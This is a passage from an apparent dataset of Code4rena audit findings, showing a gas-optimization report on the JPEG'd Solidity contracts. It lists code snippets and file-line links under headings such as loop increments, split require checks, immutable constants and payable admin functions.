`for`-loops (`--i`/`i--` too)\n\n1. File: contracts/vaults/NFTVault.sol (line [181](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/NFTVault.sol#L181))\n```solidity\n        for (uint256 i = 0; i < _typeInitializers.length; i++) {\n```\n2. File: contracts/vaults/NFTVault.sol (line [184](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/NFTVault.sol#L184))\n```solidity\n            for (uint256 j = 0; j < initializer.nfts.length; j++) {\n```\n3. File: contracts/vaults/yVault/strategies/StrategyPUSDConvex.sol (line [145](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/yVault/strategies/StrategyPUSDConvex.sol#L145))\n```solidity\n        for (uint256 i = 0; i < _strategyConfig.rewardTokens.length; i++) {\n```\n4. File: contracts/vaults/yVault/strategies/StrategyPUSDConvex.sol (line [231](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/yVault/strategies/StrategyPUSDConvex.sol#L231))\n```solidity\n        for (uint256 i = 0; i < length; i++) {\n```\n5. File: contracts/vaults/yVault/strategies/StrategyPUSDConvex.sol (line [319](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/yVault/strategies/StrategyPUSDConvex.sol#L319))\n```solidity\n            for (uint256 i = 0; i < rewardTokens.length; i++) {\n```\n6. File: contracts/farming/LPFarming.sol (line [348](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/farming/LPFarming.sol#L348))\n```solidity\n        for (uint256 i = 0; i < poolInfo.length; i++) {\n```\n\n### Splitting `require()` statements that use `&&` saves gas\nSee [this issue](https://github.com/code-423n4/2022-01-xdefi-findings/issues/128) for an example\n\n1. File: contracts/escrow/NFTEscrow.sol (lines [86-89](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/escrow/NFTEscrow.sol#L86-L89))\n```solidity\n        require(\n            _owner != address(this) && _owner != address(0),\n            \"NFTEscrow: invalid_owner\"\n        );\n```\n2. File: contracts/vaults/NFTVault.sol (lines [401-404](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/NFTVault.sol#L401-L404))\n```solidity\n        require(\n            rate.denominator > 0 && rate.denominator >= rate.numerator,\n            \"invalid_rate\"\n        );\n```\n3. File: contracts/vaults/FungibleAssetVaultForDAO.sol (lines [93-98](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/FungibleAssetVaultForDAO.sol#L93-L98))\n```solidity\n        require(\n            _creditLimitRate.denominator > 0 &&\n                //denominator can be equal to the numerator in some cases (stablecoins used as collateral)\n                _creditLimitRate.denominator >= _creditLimitRate.numerator,\n            \"invalid_rate\"\n        );\n```\n4. File: contracts/vaults/FungibleAssetVaultForDAO.sol (line [194](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/FungibleAssetVaultForDAO.sol#L194))\n```solidity\n        require(amount > 0 && amount <= collateralAmount, \"invalid_amount\");\n```\n5. File: contracts/vaults/yVault/yVault.sol (lines [99-102](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/yVault/yVault.sol#L99-L102))\n```solidity\n        require(\n            _rate.numerator > 0 && _rate.denominator >= _rate.numerator,\n            \"INVALID_RATE\"\n        );\n```\n6. File: contracts/vaults/yVault/strategies/StrategyPUSDConvex.sol (lines [181-185](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/yVault/strategies/StrategyPUSDConvex.sol#L181-L185))\n```solidity\n        require(\n            _performanceFee.denominator > 0 &&\n                _performanceFee.denominator >= _performanceFee.numerator,\n            \"INVALID_RATE\"\n        );\n```\n7. File: contracts/staking/JPEGStaking.sol (lines [45-48](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/staking/JPEGStaking.sol#L45-L48))\n```solidity\n        require(\n            _amount > 0 && _amount <= balanceOf(msg.sender),\n            \"invalid_amount\"\n        );\n```\n\n### Usage of `uints`/`ints` smaller than 32 bytes (256 bits) incurs overhead\n> When using elements that are smaller than 32 bytes, your contract’s gas usage may be higher. This is because the EVM operates on 32 bytes at a time. Therefore, if the element is smaller than that, the EVM must use more operations in order to reduce the size of the element from 32 bytes to the desired size.\n\nhttps://docs.soliditylang.org/en/v0.8.11/internals/layout_in_storage.html\nUse a larger size then downcast where needed\n\n1. File: contracts/vaults/NFTVault.sol (line [55](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/NFTVault.sol#L55))\n```solidity\n        uint128 numerator;\n```\n2. File: contracts/vaults/NFTVault.sol (line [56](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/NFTVault.sol#L56))\n```solidity\n        uint128 denominator;\n```\n3. File: contracts/vaults/NFTVault.sol (line [460](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/NFTVault.sol#L460))\n```solidity\n        uint8 decimals = aggregator.decimals();\n```\n4. File: contracts/vaults/FungibleAssetVaultForDAO.sol (line [37](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/FungibleAssetVaultForDAO.sol#L37))\n```solidity\n        uint128 numerator;\n```\n5. File: contracts/vaults/FungibleAssetVaultForDAO.sol (line [38](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/FungibleAssetVaultForDAO.sol#L38))\n```solidity\n        uint128 denominator;\n```\n6. File: contracts/vaults/FungibleAssetVaultForDAO.sol (line [106](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/FungibleAssetVaultForDAO.sol#L106))\n```solidity\n        uint8 decimals = oracle.decimals();\n```\n7. File: contracts/vaults/yVault/yVault.sol (line [24](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/yVault/yVault.sol#L24))\n```solidity\n        uint128 numerator;\n```\n8. File: contracts/vaults/yVault/yVault.sol (line [25](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/yVault/yVault.sol#L25))\n```solidity\n        uint128 denominator;\n```\n9. File: contracts/vaults/yVault/yVault.sol (line [70](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/yVault/yVault.sol#L70))\n```solidity\n    function decimals() public view virtual override returns (uint8) {\n```\n10. File: contracts/vaults/yVault/strategies/StrategyPUSDConvex.sol (line [28](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/yVault/strategies/StrategyPUSDConvex.sol#L28))\n```solidity\n        uint128 numerator;\n```\n11. File: contracts/vaults/yVault/strategies/StrategyPUSDConvex.sol (line [29](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/yVault/strategies/StrategyPUSDConvex.sol#L29))\n```solidity\n        uint128 denominator;\n```\n\n### `abi.encode()` is less efficient than `abi.encodePacked()`\n\n1. File: contracts/escrow/NFTEscrow.sol (line [52](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/escrow/NFTEscrow.sol#L52))\n```solidity\n                abi.encode(nftAddress, _encodeFlashEscrowPayload(_idx))\n```\n\n### Expressions for constant values such as a call to `keccak256()`, should use `immutable` rather than `constant`\nSee [this](https://github.com/ethereum/solidity/issues/9232) issue for a detail description of the issue\n\n1. File: contracts/vaults/NFTVault.sol (line [71](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/NFTVault.sol#L71))\n```solidity\n    bytes32 public constant DAO_ROLE = keccak256(\"DAO_ROLE\");\n```\n2. File: contracts/vaults/NFTVault.sol (line [72](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/NFTVault.sol#L72))\n```solidity\n    bytes32 public constant LIQUIDATOR_ROLE = keccak256(\"LIQUIDATOR_ROLE\");\n```\n3. File: contracts/vaults/NFTVault.sol (line [74](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/NFTVault.sol#L74))\n```solidity\n    bytes32 public constant CUSTOM_NFT_HASH = keccak256(\"CUSTOM\");\n```\n4. File: contracts/vaults/FungibleAssetVaultForDAO.sol (line [41](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/FungibleAssetVaultForDAO.sol#L41))\n```solidity\n    bytes32 public constant WHITELISTED_ROLE = keccak256(\"WHITELISTED_ROLE\");\n```\n5. File: contracts/vaults/yVault/Controller.sol (line [15](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/yVault/Controller.sol#L15))\n```solidity\n    bytes32 public constant STRATEGIST_ROLE = keccak256(\"STRATEGIST_ROLE\");\n```\n6. File: contracts/vaults/yVault/strategies/StrategyPUSDConvex.sol (line [66](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/yVault/strategies/StrategyPUSDConvex.sol#L66))\n```solidity\n    bytes32 public constant STRATEGIST_ROLE = keccak256(\"STRATEGIST_ROLE\");\n```\n7. File: contracts/tokens/StableCoin.sol (line [22](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/tokens/StableCoin.sol#L22))\n```solidity\n    bytes32 public constant MINTER_ROLE = keccak256(\"MINTER_ROLE\");\n```\n8. File: contracts/tokens/StableCoin.sol (line [23](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/tokens/StableCoin.sol#L23))\n```solidity\n    bytes32 public constant PAUSER_ROLE = keccak256(\"PAUSER_ROLE\");\n```\n9. File: contracts/tokens/JPEG.sol (line [10](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/tokens/JPEG.sol#L10))\n```solidity\n    bytes32 public constant MINTER_ROLE = keccak256(\"MINTER_ROLE\");\n```\n\n### Using `private` rather than `public` for constants, saves gas\nIf needed, the value can be read from the verified contract source code\n\n1. File: contracts/vaults/NFTVault.sol (line [71](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/NFTVault.sol#L71))\n```solidity\n    bytes32 public constant DAO_ROLE = keccak256(\"DAO_ROLE\");\n```\n2. File: contracts/vaults/NFTVault.sol (line [72](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/NFTVault.sol#L72))\n```solidity\n    bytes32 public constant LIQUIDATOR_ROLE = keccak256(\"LIQUIDATOR_ROLE\");\n```\n3. File: contracts/vaults/NFTVault.sol (line [74](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/NFTVault.sol#L74))\n```solidity\n    bytes32 public constant CUSTOM_NFT_HASH = keccak256(\"CUSTOM\");\n```\n4. File: contracts/vaults/FungibleAssetVaultForDAO.sol (line [41](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/FungibleAssetVaultForDAO.sol#L41))\n```solidity\n    bytes32 public constant WHITELISTED_ROLE = keccak256(\"WHITELISTED_ROLE\");\n```\n5. File: contracts/vaults/yVault/Controller.sol (line [15](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/yVault/Controller.sol#L15))\n```solidity\n    bytes32 public constant STRATEGIST_ROLE = keccak256(\"STRATEGIST_ROLE\");\n```\n6. File: contracts/vaults/yVault/strategies/StrategyPUSDConvex.sol (line [66](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/yVault/strategies/StrategyPUSDConvex.sol#L66))\n```solidity\n    bytes32 public constant STRATEGIST_ROLE = keccak256(\"STRATEGIST_ROLE\");\n```\n7. File: contracts/tokens/StableCoin.sol (line [22](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/tokens/StableCoin.sol#L22))\n```solidity\n    bytes32 public constant MINTER_ROLE = keccak256(\"MINTER_ROLE\");\n```\n8. File: contracts/tokens/StableCoin.sol (line [23](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/tokens/StableCoin.sol#L23))\n```solidity\n    bytes32 public constant PAUSER_ROLE = keccak256(\"PAUSER_ROLE\");\n```\n9. File: contracts/tokens/JPEG.sol (line [10](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/tokens/JPEG.sol#L10))\n```solidity\n    bytes32 public constant MINTER_ROLE = keccak256(\"MINTER_ROLE\");\n```\n\n### Don't compare boolean expressions to boolean literals\n`if (<x> == true)` => `if (<x>)`, `if (<x> == false)` => `if (!<x>)`\n\n1. File: contracts/vaults/yVault/Controller.sol (line [87](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/yVault/Controller.sol#L87))\n```solidity\n            approvedStrategies[_token][_strategy] == true,\n```\n\n### Duplicated `require()`/`revert()` checks should be refactored to a modifier or function\n\n1. File: contracts/vaults/NFTVault.sol (line [764](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/NFTVault.sol#L764))\n```solidity\n        require(_amount > 0, \"invalid_amount\");\n```\n2. File: contracts/vaults/NFTVault.sol (line [767](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/NFTVault.sol#L767))\n```solidity\n        require(position.liquidatedAt == 0, \"liquidated\");\n```\n3. File: contracts/vaults/NFTVault.sol (line [805](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/NFTVault.sol#L805))\n```solidity\n        require(msg.sender == positionOwner[_nftIndex], \"unauthorized\");\n```\n4. File: contracts/vaults/NFTVault.sol (line [926](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/NFTVault.sol#L926))\n```solidity\n        require(position.liquidatedAt > 0, \"not_liquidated\");\n```\n5. File: contracts/vaults/FungibleAssetVaultForDAO.sol (line [164](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/FungibleAssetVaultForDAO.sol#L164))\n```solidity\n        require(amount > 0, \"invalid_amount\");\n```\n6. File: contracts/vaults/yVault/Controller.sol (line [73](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/yVault/Controller.sol#L73))\n```solidity\n        require(address(_token) != address(0), \"INVALID_TOKEN\");\n```\n7. File: contracts/vaults/yVault/Controller.sol (line [74](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/yVault/Controller.sol#L74))\n```solidity\n        require(address(_strategy) != address(0), \"INVALID_STRATEGY\");\n```\n8. File: contracts/vaults/yVault/Controller.sol (line [164](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/yVault/Controller.sol#L164))\n```solidity\n        require(msg.sender == vaults[_token], \"NOT_VAULT\");\n```\n9. File: contracts/vaults/yVault/strategies/StrategyPUSDConvex.sol (line [292](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/yVault/strategies/StrategyPUSDConvex.sol#L292))\n```solidity\n        require(vault != address(0), \"ZERO_VAULT\"); // additional protection so we don't burn the funds\n```\n10. File: contracts/farming/yVaultLPFarming.sol (line [118](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/farming/yVaultLPFarming.sol#L118))\n```solidity\n        require(_amount > 0, \"invalid_amount\");\n```\n11. File: contracts/farming/LPFarming.sol (line [239](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/farming/LPFarming.sol#L239))\n```solidity\n        require(_amount > 0, \"invalid_amount\");\n```\n12. File: contracts/farming/LPFarming.sol (line [354](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/farming/LPFarming.sol#L354))\n```solidity\n        require(rewards > 0, \"no_reward\");\n```\n\n### Stack variable used as a cheaper cache for a state variable is only used once\nIf the variable is only accessed once, it's cheaper to use the state variable directly that one time\n\n1. File: contracts/farming/yVaultLPFarming.sol (line [81](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/farming/yVaultLPFarming.sol#L81))\n```solidity\n        uint256 staked = totalStaked;\n```\n\n### State variables only set in the constructor should be declared `immutable`\n\n1. File: contracts/vaults/yVault/strategies/StrategyPUSDConvex.sol (line [75](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/yVault/strategies/StrategyPUSDConvex.sol#L75))\n```solidity\n    DexConfig public dexConfig;\n```\n2. File: contracts/vaults/yVault/strategies/StrategyPUSDConvex.sol (line [76](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/yVault/strategies/StrategyPUSDConvex.sol#L76))\n```solidity\n    CurveConfig public curveConfig;\n```\n3. File: contracts/vaults/yVault/strategies/StrategyPUSDConvex.sol (line [77](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/yVault/strategies/StrategyPUSDConvex.sol#L77))\n```solidity\n    ConvexConfig public convexConfig;\n```\n4. File: contracts/vaults/yVault/strategies/StrategyPUSDConvex.sol (line [78](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/yVault/strategies/StrategyPUSDConvex.sol#L78))\n```solidity\n    StrategyConfig public strategyConfig;\n```\n\n### `require()` or `revert()` statements that check input arguments should be at the top of the function\nChecks that involve constants should come before checks that involve state variables\n\n1. File: contracts/vaults/NFTVault.sol (line [687](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/NFTVault.sol#L687))\n```solidity\n        require(_amount > 0, \"invalid_amount\");\n```\n2. File: contracts/vaults/NFTVault.sol (line [764](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/NFTVault.sol#L764))\n```solidity\n        require(_amount > 0, \"invalid_amount\");\n```\n3. File: contracts/vaults/yVault/Controller.sol (line [49](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/yVault/Controller.sol#L49))\n```solidity\n        require(_vault != address(0), \"INVALID_VAULT\");\n```\n4. File: contracts/farming/LPFarming.sol (line [243](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/farming/LPFarming.sol#L243))\n```solidity\n        require(user.amount >= _amount, \"insufficient_amount\");\n```\n\n### Functions guaranteed to revert when called by normal users can be marked `payable`\nIf a function modifier such as `onlyOwner` is used, the function will revert if a normal user tries to pay the function. Marking the function as `payable` will lower the gas cost for legitimate callers because the compiler will not include checks for whether a payment was provided.\n\n1. File: contracts/vaults/NFTVault.sol (lines [203-205](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/NFTVault.sol#L203-L205))\n```solidity\n    function setBorrowAmountCap(uint256 _borrowAmountCap)\n        external\n        onlyRole(DAO_ROLE)\n```\n2. File: contracts/vaults/NFTVault.sol (lines [212-214](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/NFTVault.sol#L212-L214))\n```solidity\n    function setDebtInterestApr(Rate memory _debtInterestApr)\n        external\n        onlyRole(DAO_ROLE)\n```\n3. File: contracts/vaults/NFTVault.sol (lines [222-224](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/NFTVault.sol#L222-L224))\n```solidity\n    function setValueIncreaseLockRate(Rate memory _valueIncreaseLockRate)\n        external\n        onlyRole(DAO_ROLE)\n```\n4. File: contracts/vaults/NFTVault.sol (lines [232-234](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/NFTVault.sol#L232-L234))\n```solidity\n    function setCreditLimitRate(Rate memory _creditLimitRate)\n        external\n        onlyRole(DAO_ROLE)\n```\n5. File: contracts/vaults/NFTVault.sol (lines [247-249](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/NFTVault.sol#L247-L249))\n```solidity\n    function setLiquidationLimitRate(Rate memory _liquidationLimitRate)\n        external\n        onlyRole(DAO_ROLE)\n```\n6. File: contracts/vaults/NFTVault.sol (lines [262-264](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/NFTVault.sol#L262-L264))\n```solidity\n    function toggleFallbackOracle(bool _useFallback)\n        external\n        onlyRole(DAO_ROLE)\n```\n7. File: contracts/vaults/NFTVault.sol (line [271](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/NFTVault.sol#L271))\n```solidity\n    function setJPEGLockTime(uint256 _newLockTime) external onlyRole(DAO_ROLE) {\n```\n8. File: contracts/vaults/NFTVault.sol (line [277](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/NFTVault.sol#L277))\n```solidity\n    function overrideFloor(uint256 _newFloor) external onlyRole(DAO_ROLE) {\n```\n9. File: contracts/vaults/NFTVault.sol (line [284](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/NFTVault.sol#L284))\n```solidity\n    function disableFloorOverride() external onlyRole(DAO_ROLE) {\n```\n10. File: contracts/vaults/NFTVault.sol (lines [290-292](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/NFTVault.sol#L290-L292))\n```solidity\n    function setOrganizationFeeRate(Rate memory _organizationFeeRate)\n        external\n        onlyRole(DAO_ROLE)\n```\n11. File: contracts/vaults/NFTVault.sol (lines [300-302](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/NFTVault.sol#L300-L302))\n```solidity\n    function setInsurancePurchaseRate(Rate memory _insurancePurchaseRate)\n        external\n        onlyRole(DAO_ROLE)\n```\n12. File: contracts/vaults/NFTVault.sol (lines [310-312](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/NFTVault.sol#L310-L312))\n```solidity\n    function setInsuranceLiquidationPenaltyRate(\n        Rate memory _insuranceLiquidationPenaltyRate\n    ) external onlyRole(DAO_ROLE) {\n```\n13. File: contracts/vaults/NFTVault.sol (lines [321-324](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/NFTVault.sol#L321-L324))\n```solidity\n    function setNFTType(uint256 _nftIndex, bytes32 _type)\n        external\n        validNFTIndex(_nftIndex)\n        onlyRole(DAO_ROLE)\n```\n14. File: contracts/vaults/NFTVault.sol (lines [336-338](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/NFTVault.sol#L336-L338))\n```solidity\n    function setNFTTypeValueETH(bytes32 _type, uint256 _amountETH)\n        external\n        onlyRole(DAO_ROLE)\n```\n15. File: contracts/vaults/NFTVault.sol (lines [347-350](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/NFTVault.sol#L347-L350))\n```solidity\n    function setPendingNFTValueETH(uint256 _nftIndex, uint256 _amountETH)\n        external\n        validNFTIndex(_nftIndex)\n        onlyRole(DAO_ROLE)\n```\n16. File: contracts/vaults/NFTVault.sol (lines [830-834](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/NFTVault.sol#L830-L834))\n```solidity\n    function liquidate(uint256 _nftIndex)\n        external\n        onlyRole(LIQUIDATOR_ROLE)\n        validNFTIndex(_nftIndex)\n        nonReentrant\n```\n17. File: contracts/vaults/NFTVault.sol (line [944](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/NFTVault.sol#L944))\n```solidity\n    function collect() external nonReentrant onlyRole(DAO_ROLE) {\n```\n18. File: contracts/vaults/FungibleAssetVaultForDAO.sol (line [92](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/FungibleAssetVaultForDAO.sol#L92))\n```solidity\n    function setCreditLimitRate(Rate memory _creditLimitRate) public onlyRole(DEFAULT_ADMIN_ROLE) {\n```\n19. File: contracts/vaults/FungibleAssetVaultForDAO.sol (line [141](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/FungibleAssetVaultForDAO.sol#L141))\n```solidity\n    function deposit(uint256 amount) external payable onlyRole(WHITELISTED_ROLE) {\n```\n20. File: contracts/vaults/FungibleAssetVaultForDAO.sol (line [163](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/FungibleAssetVaultForDAO.sol#L163))\n```solidity\n    function borrow(uint256 amount) external onlyRole(WHITELISTED_ROLE) nonReentrant {\n```\n21. File: contracts/vaults/FungibleAssetVaultForDAO.sol (line [179](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/FungibleAssetVaultForDAO.sol#L179))\n```solidity\n    function repay(uint256 amount) external onlyRole(WHITELISTED_ROLE) nonReentrant {\n```\n22. File: contracts/vaults/FungibleAssetVaultForDAO.sol (line [193](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/FungibleAssetVaultForDAO.sol#L193))\n```solidity\n    function withdraw(uint256 amount) external onlyRole(WHITELISTED_ROLE) nonReentrant {\n```\n23. File: contracts/vaults/yVault/Controller.sol (lines [33-35](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/yVault/Controller.sol#L33-L35))\n```solidity\n    function setFeeAddress(address _feeAddress)\n        public\n        onlyRole(DEFAULT_ADMIN_ROLE)\n```\n24. File: contracts/vaults/yVault/Controller.sol (lines [44-46](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/yVault/Controller.sol#L44-L46))\n```solidity\n    function setVault(IERC20 _token, address _vault)\n        external\n        onlyRole(STRATEGIST_ROLE)\n```\n25. File: contracts/vaults/yVault/Controller.sol (lines [56-58](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/yVault/Controller.sol#L56-L58))\n```solidity\n    function approveStrategy(IERC20 _token, IStrategy _strategy)\n        external\n        onlyRole(DEFAULT_ADMIN_ROLE)\n```\n",
    "dataSource": {
      "name": "code-423n4/2022-04-jpegd-findings",
      "repo": "https://github.com/code-423n4/2022-04-jpegd-findings",
      "url": "https://github.com/code-423n4/2022-04-jpegd-findings/issues/207"
    }
  },
  {
    "title": "QA Report",
